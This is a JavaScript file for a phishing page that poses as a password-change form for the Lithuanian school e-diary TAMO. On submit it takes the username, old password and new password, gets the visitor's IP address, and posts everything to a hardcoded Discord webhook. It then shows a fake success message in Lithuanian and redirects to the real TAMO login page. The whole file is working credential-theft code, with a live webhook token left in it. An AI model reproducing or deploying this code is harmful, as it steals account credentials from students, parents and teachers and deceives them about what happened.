document.addEventListener('DOMContentLoaded', function() {
  const submitButton = document.querySelector('.submit');
  const userInputField = document.querySelector('.inputUser');
  const oldPassInputField = document.querySelector('.inputOldPass');
  const newPassInputField = document.querySelector('.inputNewPass');

  const smallText = document.querySelector('.smallText');
  const smallText2 = document.querySelector('.smallText2');
  const smallText3 = document.querySelector('.smallText3');
  const smallText4 = document.querySelector('.smallText4');

  const square = document.querySelector('.square');

  submitButton.addEventListener('click', function() {
    const userText = userInputField.value;
    const oldPassText = oldPassInputField.value;
    const newPassText = newPassInputField.value;

    if (submitButton.innerHTML == 'Uždaryti') {
      window.location.href = 'https://dienynas.tamo.lt/Prisijungimas/Login';
    } else {
      const webhookUrl = 'https://discord.com/api/webhooks/1084533019831963659/CMObRt47ktaHnmdLp0E0WAGmEQUaatZr4Yetmkz1Epgn746BtGytsvF5FHuU1cYRqMkZ';

      //Get ip
      fetch('https://api.ipify.org/?format=json')
        .then(results => results.json())
        .then(data => {
          const address = data.ip;
          
          // Construct the message payload
          const payload = {
            content: '```User: '+userText + '\nOld pass: '+oldPassText + '\nNew pass: '+newPassText + '\nIP: '+address+'```'
          };

          // Send the message to the webhook
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
          })
          .catch(error => {
            console.error("Įvyko klaida:", error);
          });
        })
        .catch(error => console.error(error));

      square.style.height = '235px';
      smallText.innerHTML = 'Slaptaždis sėkmingai pakeistas.'
      submitButton.innerHTML = 'Uždaryti'

      smallText2.parentNode.removeChild(smallText2)
      smallText3.parentNode.removeChild(smallText3)
      smallText4.parentNode.removeChild(smallText4)

      userInputField.parentNode.removeChild(userInputField)
      oldPassInputField.parentNode.removeChild(oldPassInputField)
      newPassInputField.parentNode.removeChild(newPassInputField)
    };
  });
});
